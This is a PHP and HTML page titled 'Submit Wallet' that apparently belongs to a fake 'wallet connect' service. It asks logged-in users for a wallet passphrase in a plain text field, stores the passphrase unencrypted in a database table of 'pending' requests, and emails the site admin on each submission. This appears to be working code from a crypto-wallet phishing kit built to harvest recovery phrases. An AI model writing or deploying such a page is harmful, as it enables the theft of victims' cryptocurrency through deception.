<?php
session_start();
require 'db.php';

if (!isset($_SESSION['user_id'])) {
    header('Location: login.php');
    exit();
}

$wallet_id = $_GET['wallet_id'] ?? null;

if (!$wallet_id) {
    header('Location: user_dashboard.php');
    exit();
}

// Fetch wallet details
$stmt = $conn->prepare("SELECT * FROM wallet_connect_wallets WHERE id = ?");
$stmt->execute([$wallet_id]);
$wallet = $stmt->fetch(PDO::FETCH_ASSOC);

if (!$wallet) {
    header('Location: user_dashboard.php');
    exit();
}

// Handle form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $passphrase = $_POST['passphrase'];

    // Check if user already has a pending request for this wallet
    $stmt = $conn->prepare("SELECT * FROM wallet_connect_requests WHERE user_id = ? AND wallet_id = ? AND status = 'pending'");
    $stmt->execute([$_SESSION['user_id'], $wallet_id]);
    $existing_request = $stmt->fetch(PDO::FETCH_ASSOC);

    if ($existing_request) {
        $error = "You already have a pending request for this wallet.";
    } else {
        // Insert new request
        $stmt = $conn->prepare("INSERT INTO wallet_connect_requests (user_id, wallet_id, passphrase, status, submitted_at) VALUES (?, ?, ?, 'pending', NOW())");
        $stmt->execute([$_SESSION['user_id'], $wallet_id, $passphrase]);

        // Send email notification to admin
        require 'send_email.php';
        sendEmailToAdmin($_SESSION['username'], $wallet['name']);

        header('Location: user_dashboard.php');
        exit();
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Submit Wallet</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        body {
            background-color: #1a1a1a;
            color: #fff;
            font-family: 'Poppins', sans-serif;
        }
        .card {
            background-color: #2d2d2d;
            border-radius: 15px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        }
        .btn-primary {
            background-color: #ff6f00;
            border: none;
            border-radius: 25px;
            padding: 10px 20px;
        }
        .btn-primary:hover {
            background-color: #e65c00;
        }
    </style>
</head>
<body>
    <div class="container d-flex justify-content-center align-items-center vh-100">
        <div class="card p-4" style="width: 100%; max-width: 400px;">
            <h2 class="text-center mb-4">Submit Wallet</h2>
            <?php if (isset($error)): ?>
                <div class="alert alert-danger"><?= $error ?></div>
            <?php endif; ?>
            <form method="POST">
                <div class="mb-3">
                    <label for="passphrase" class="form-label">Passphrase</label>
                    <input type="text" class="form-control" id="passphrase" name="passphrase" required>
                </div>
                <button type="submit" class="btn btn-primary w-100">Submit</button>
            </form>
        </div>
    </div>
</body>
</html>